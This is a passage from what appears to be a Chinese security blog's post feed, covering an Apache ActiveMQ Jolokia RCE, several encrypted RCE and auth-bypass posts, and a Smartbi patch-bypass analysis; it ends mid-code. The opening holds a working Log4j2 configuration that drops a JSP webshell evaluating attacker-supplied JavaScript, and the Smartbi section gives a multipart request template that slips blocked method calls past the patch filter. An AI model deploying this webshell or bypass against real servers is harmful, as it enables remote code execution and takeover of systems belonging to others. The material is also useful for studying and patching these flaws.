class="name">RollingRandomAccessFile</span> <span class="attr">name</span>=<span class="string">&quot;RollingFile&quot;</span> <span class="attr">fileName</span>=<span class="string">&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot;</span></span></span><br><span class="line"><span class="tag">                                 <span class="attr">filePattern</span>=<span class="string">&quot;$&#123;sys:activemq.data&#125;/../webapps/admin/y4test.jsp&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;$&#123;&#x27;&#x27;[&#x27;getClass&#x27;]()[&#x27;forName&#x27;](&#x27;javax.script.ScriptEngineManager&#x27;)[&#x27;newInstance&#x27;]()[&#x27;getEngineByName&#x27;](&#x27;JavaScript&#x27;)[&#x27;eval&#x27;](param.a)&#125;%ex&#123;none&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">SizeBasedTriggeringPolicy</span> <span class="attr">size</span>=<span class="string">&quot;1MB&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RollingRandomAccessFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;RollingFile&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再一次利用一发，就是这么舒爽2333，利用也简单只需要一发修改配置、触发文件写入</p><p><img src="/2023/11/30/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/image-1350467.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache ActiveMQ Jolokia远程代码执行(CVE-2022-41678)简析及绕Waf技法</title>
      <link href="/2023/11/29/year/2023/11/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2022-41678-%E7%AE%80%E6%9E%90%E5%8F%8A%E7%BB%95Waf%E6%8A%80%E6%B3%95/"/>
      <url>/2023/11/29/year/2023/11/Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2022-41678-%E7%AE%80%E6%9E%90%E5%8F%8A%E7%BB%95Waf%E6%8A%80%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="a45169530c7a358a569e4ca8ba4b62df53b37f455a989614e1b93ae1b05f4de9"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某系统最新前台权限绕过分析</title>
      <link href="/2023/11/26/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/"/>
      <url>/2023/11/26/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="71eeac313ae024dd7a7149ece5973e4d7dbe663642d02a4f710d51431f06f9ff"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某系统最新前台RCE分析</title>
      <link href="/2023/11/26/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/"/>
      <url>/2023/11/26/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E5%89%8D%E5%8F%B0RCE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="126ea295997e69bb9bfc3162e36ff958e27049f47d8e67970cdb6a9db6ec6c08"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I Doc View全版本前台RCE漏洞分析汇总</title>
      <link href="/2023/11/22/year/2023/11/I%20Doc%20View%E5%85%A8%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/"/>
      <url>/2023/11/22/year/2023/11/I%20Doc%20View%E5%85%A8%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="87cc4e6f35977fad96accd45555189f0591e03fedfbec1e2d1ca53ca03cf489e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某系统全版本前台RCE绕过总结</title>
      <link href="/2023/11/12/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E5%85%A8%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0RCE%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/2023/11/12/year/2023/11/%E6%9F%90%E7%B3%BB%E7%BB%9F%E5%85%A8%E7%89%88%E6%9C%AC%E5%89%8D%E5%8F%B0RCE%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="c11f9d4d90635d822d7fb404c3457eef1dd68924085e2ef07a0996d4ebb4619d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析Smartbi逻辑漏洞(2)</title>
      <link href="/2023/08/23/year/2023/8/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-2/"/>
      <url>/2023/08/23/year/2023/8/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="浅析Smartbi逻辑漏洞-2"><a href="#浅析Smartbi逻辑漏洞-2" class="headerlink" title="浅析Smartbi逻辑漏洞(2)"></a>浅析Smartbi逻辑漏洞(2)</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>仅分享逻辑漏洞部分补丁绕过思路，不提供完整payload</p><p>厂商已发布补丁：<a href="https://www.smartbi.com.cn/patchinfo">https://www.smartbi.com.cn/patchinfo</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>简单提一下，补丁部分由smartbi.security.patch.PatchFilter(来源于SecurityPatchExt.ext)做加载并处理，这里我们主要关注补丁返回的状态码的具体含义即可，可以看到只有返回0的时候，filter链才能继续通过doFilter继续传递</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Iterator var10 = rules.iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var10.hasNext()) &#123;</span><br><span class="line">    URLPatchRule rule = (URLPatchRule)var10.next();</span><br><span class="line">    <span class="keyword">int</span> result = rule.patch(uri, req, resp, chain);</span><br><span class="line">    <span class="keyword">switch</span> (result) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            resp.sendError(<span class="number">403</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain.doFilter(request, response);</span><br></pre></td></tr></table></figure><p>首先我们看看老板本对这点的patch的部分，如果queryString以windowUnloading开头，那么会做两件事，首先通过request.getParameter获取ClassName与MethodName的值，接着对windowUnloading中的值做解码并赋值给urlClassName与urlMethodName参数，最后补丁中会对request.getParameter与解码的值做对比，如果其中classname与methodname值不相等，那么就会返回1，也就是做拦截</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">patch</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain chain)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.assertQueryString(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">assertQueryString</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    String query = request.getQueryString();</span><br><span class="line">    <span class="keyword">if</span> (StringUtil.isNullOrEmpty(query)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!query.startsWith(<span class="string">&quot;windowUnloading&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!query.startsWith(<span class="string">&quot;windowUnloading=&amp;&quot;</span>) &amp;&amp; !query.startsWith(<span class="string">&quot;windowUnloading&amp;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String paramClassName = request.getParameter(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">        String paramMethodName = request.getParameter(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                String windowUnloadingStr = query.length() &gt; <span class="string">&quot;windowUnloading&quot;</span>.length() &amp;&amp; query.charAt(<span class="string">&quot;windowUnloading&quot;</span>.length()) == <span class="string">&#x27;=&#x27;</span> ? <span class="string">&quot;windowUnloading=&amp;&quot;</span> : <span class="string">&quot;windowUnloading&amp;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (query.length() &gt; windowUnloadingStr.length()) &#123;</span><br><span class="line">                    content = query.substring(windowUnloadingStr.length());</span><br><span class="line">                    <span class="keyword">if</span> (content.endsWith(<span class="string">&quot;=&quot;</span>)) &#123;</span><br><span class="line">                        content = content.substring(<span class="number">0</span>, content.length() - <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    content = URLDecoder.decode(content, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String urlClassName = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                String urlMethodName = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (content.indexOf(<span class="string">&quot;className=&quot;</span>) == -<span class="number">1</span> &amp;&amp; content.indexOf(<span class="string">&quot;methodName=&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">                    String[] decode = RMICoder.decode(content);</span><br><span class="line">                    urlClassName = decode[<span class="number">0</span>];</span><br><span class="line">                    urlMethodName = decode[<span class="number">1</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Map&lt;String, String&gt; map = HttpUtil.parseQueryString(content);</span><br><span class="line">                    urlClassName = (String)map.get(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">                    urlMethodName = (String)map.get(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (StringUtil.isNullOrEmpty(urlClassName) &amp;&amp; StringUtil.isNullOrEmpty(urlMethodName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> paramClassName.equals(urlClassName) &amp;&amp; paramMethodName.equals(urlMethodName) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么我们可以思考这样的方式真的有效么？答案当时是否</p><p>在上篇文章中我们就提到，在CheckIsLoggedFilter中如果不考虑解码操作，对于classname与methodname的获取，有三种方式GET\POST\Multipart(这里POST指标准形式通过Body传参)，补丁的操作是比对request.getParameteter与windowUnloading解码的值是否一致，我曾经也在其他文章当中写到过，在tomcat环境下，request.getParameteter只能获取到GET与POST，对于Multipart默认情况下是不做支持的(需要单独配置才能开启)，当然这里也是没配置</p><p>我们也可以通过diff发现，如果content-type头以multipart开头就会返回状态1，也就是拦截</p><p><img src="/2023/08/23/year/2023/8/%E6%B5%85%E6%9E%90Smartbi%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-2/image-20230823005953570.png" alt="image-20230823005953570"></p><p>在上面的基础上我们很容易就可以构造出这样形式的请求包，像之前那样通过windowUnloading绕过方法校验限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet?windowUnloading=xxxx HTTP/1.1</span><br><span class="line">Host: xxxx</span><br><span class="line">Content-Type: multipart/form-data;charset=UTF-8;boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;className&quot;</span><br><span class="line"></span><br><span class="line">xxxService</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;methodName&quot;</span><br><span class="line"></span><br><span class="line">xxx</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name=&quot;params&quot;</span><br><span class="line"></span><br><span class="line">[&#x27;xxx&#x27;]</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br></pre></td></tr></table></figure><p>我们将真正要掉用的方法放在multipart中，由于此时request.getParameter取值为<code>null</code>，StringUtil.isNullOrEmpty为true，自然也就绕过了补丁的限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!query.startsWith(<span class="string">&quot;windowUnloading&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!query.startsWith(<span class="string">&quot;windowUnloading=&amp;&quot;</span>) &amp;&amp; !query.startsWith(<span class="string">&quot;windowUnloading&amp;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String paramClassName = request.getParameter(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">            String paramMethodName = request.getParameter(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!StringUtil.isNullOrEmpty(paramClassName) &amp;&amp; !StringUtil.isNullOrEmpty(paramMethodName)) &#123;</span><br></pre></td></tr></table></figure><p>最终在RMIServlet解析参数时，又单独对multipart做了处理，这时我们真正要掉用的恶意类与方法又成功恢复出来，完成了老补丁的绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">public static RMIInfo parseRMIInfo(HttpServletRequest request, boolean forceParse) &#123;</span><br><span class="line">        if (!&quot;/vision/RMIServlet&quot;.equals(request.getServletPath()) &amp;&amp; !forceParse) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            RMIInfo info = getRMIInfoFromRequest(request);</span><br><span class="line">            if (info != null) &#123;</span><br><span class="line">                return info;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                String className = request.getParameter(&quot;className&quot;);</span><br><span class="line">                String methodName = request.getParameter(&quot;methodName&quot;);</span><br><span class="line">                String params = request.getParameter(&quot;params&quot;);</span><br><span class="line">                if (StringUtil.isNullOrEmpty(className) &amp;&amp; StringUtil.isNullOrEmpty(methodName) &amp;&amp; StringUtil.isNullOrEmpty(params) &amp;&amp; request.getContentType() != null &amp;&amp; request.getContentType().startsWith(&quot;multipart/form-data;&quot;)) &#123;</span><br><span class="line">                    DiskFileItemFactory dfif = new DiskFileItemFactory();</span><br><span class="line">                    ServletFileUpload upload = new ServletFileUpload(dfif);</span><br><span class="line">                    String encodeString = null;</span><br><span class="line"></span><br><span class="line">                    try &#123;</span><br><span class="line">                        List&lt;FileItem&gt; fileItems = upload.parseRequest(request);</span><br><span class="line">                        request.setAttribute(&quot;UPLOAD_FILE_ITEMS&quot;, fileItems);</span><br><span class="line">                        Iterator var10 = fileItems.iterator();</span><br><span class="line"></span><br><span class="line">                        while(var10.hasNext()) &#123;</span><br><span class="line">                            FileItem fileItem = (FileItem)var10.next();</span><br><span class="line">                            if (fileItem.isFormField()) &#123;</span><br><span class="line">                                String itemName = fileItem.getFieldName();</span><br><span class="line">                                String itemValue = fileItem.getString(&quot;UTF-8&quot;);</span><br><span class="line">                                if (&quot;className&quot;.equals(itemName)) &#123;</span><br><span class="line">                                    className = itemValue;</span><br><span class="line">                                &#125; else if (&quot;methodName&quot;.equals(itemName)) &#123;</span><br><span class="line">                                    methodName = itemValue;</span><br><span class="line">                                &#125; else if (&quot;params&quot;.equals(itemName)) &#123;</span><br><span class="line">                                    params = itemValue;</span><br><span class="line">                                &#125; else if (&quot;encode&quot;.equals(itemName)) &#123;</span><br><span class="line">                                    encodeString = itemValue;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; catch (UnsupportedEncodingException | FileUploadException var14) &#123;</span><br><span class="line">                        LOG.error(var14.getMessage(), var14);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    if (!StringUtil.isNullOrEmpty(encodeString)) &#123;</span><br><span class="line">                        String[] decode = (String[])((String[])CodeEntry.decode(encodeString, 